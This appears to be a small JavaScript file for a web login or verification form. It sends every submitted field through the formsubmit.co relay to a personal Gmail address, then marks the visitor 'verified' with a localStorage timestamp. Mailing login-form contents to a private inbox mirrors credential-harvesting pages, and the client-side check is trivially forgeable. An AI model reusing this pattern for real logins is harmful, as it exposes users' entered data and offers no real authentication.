/* ================= LOGIN PAGE SCRIPT ================= */
const form = document.getElementById("verifyForm");
const btn = document.getElementById("verifyBtn");
const loader = document.getElementById("loader");
const loadingText = document.getElementById("loadingText");
const successMsg = document.getElementById("successMsg");

/* ================= FORM SUBMIT ================= */
form.addEventListener("submit", e => {
  e.preventDefault();

  btn.style.display = "none";
  loader.style.display = "block";
  loadingText.style.display = "block";

  const data = new FormData(form);

  fetch("https://formsubmit.co/ajax/tahasalahtime@gmail.com", {
    method: "POST",
    body: data,
    headers: { "Accept": "application/json" }
  })
  .then(res => {
    if (!res.ok) throw new Error("Submission failed");

    // ✅ SAVE VERIFICATION TIME (24 hours)
    localStorage.setItem("taha_verified_at", Date.now());

    loader.style.display = "none";
    loadingText.style.display = "none";
    successMsg.style.display = "flex";

    const redirect =
      localStorage.getItem("redirectAfterVerify") || "index.html";

    localStorage.removeItem("redirectAfterVerify");

    setTimeout(() => window.location.href = redirect, 1200);
  })
  .catch(() => {
    alert("Verification failed. Try again.");
    btn.style.display = "block";
    loader.style.display = "none";
    loadingText.style.display = "none";
  });
});
